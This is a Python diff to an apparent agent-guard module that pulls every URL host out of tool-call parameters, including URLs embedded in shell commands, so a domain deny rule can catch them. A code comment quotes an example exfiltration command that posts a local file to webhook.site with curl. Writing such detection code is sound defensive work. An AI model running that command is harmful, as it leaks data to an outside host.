@@ -186,30 +186,47 @@ _BARE_HOSTNAME_RE = re.compile(
     r"(\.[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)+$"
 )
 
+# Matches a URL embedded anywhere within a larger string, not just a value
+# that IS a URL end to end. A code-review finding: the whole-string-only
+# match this replaced made iter_all_domains blind to exactly the shape that
+# matters most now that shell commands are scanned for content instead of
+# blocked by tool name — "curl -X POST https://webhook.site/x -d @/tmp/data"
+# is not itself a URL (it has a command and flags around it), so the old
+# check yielded nothing and the deny_domains rule never saw webhook.site at
+# all. Deliberately scoped to http(s) with an explicit scheme (not bare
+# embedded hostnames) to avoid false-positiving on ordinary prose containing
+# a dot — same conservative reasoning as _BARE_HOSTNAME_RE above.
+_EMBEDDED_URL_RE = re.compile(r"https?://[^\s\"'<>]+")
 
-def _domain_from_string(s: str) -> str | None:
+
+def _domains_from_string(s: str) -> Iterator[str]:
     s = s.strip()
     if not s:
-        return None
-    if "://" in s:
-        candidate = s
-    elif _BARE_HOSTNAME_RE.match(s):
-        candidate = f"https://{s}"
-    else:
-        return None
-    try:
-        return urlparse(candidate).hostname or None
-    except Exception:
-        return None
+        return
+    if _BARE_HOSTNAME_RE.match(s):
+        try:
+            host = urlparse(f"https://{s}").hostname
+        except Exception:
+            host = None
+        if host:
+            yield host
+        return
+    for match in _EMBEDDED_URL_RE.finditer(s):
+        try:
+            host = urlparse(match.group(0)).hostname
+        except Exception:
+            host = None
+        if host:
+            yield host
 
 
 def iter_all_domains(parameters: dict) -> Iterator[str]:
     """Yield every URL/hostname-shaped domain found anywhere in parameters
     (recursively), not just under url/endpoint/uri/href keys — see
-    iter_all_string_values for why."""
+    iter_all_string_values for why. A single string value can yield more
+    than one domain (e.g. a fetch-then-exfiltrate command line naming two
+    hosts), so this doesn't stop at the first match per value."""
     for val in iter_all_string_values(parameters):
-        domain = _domain_from_string(val)
-        if domain:
-            yield domain
+        yield from _domains_from_string(val)
 
 
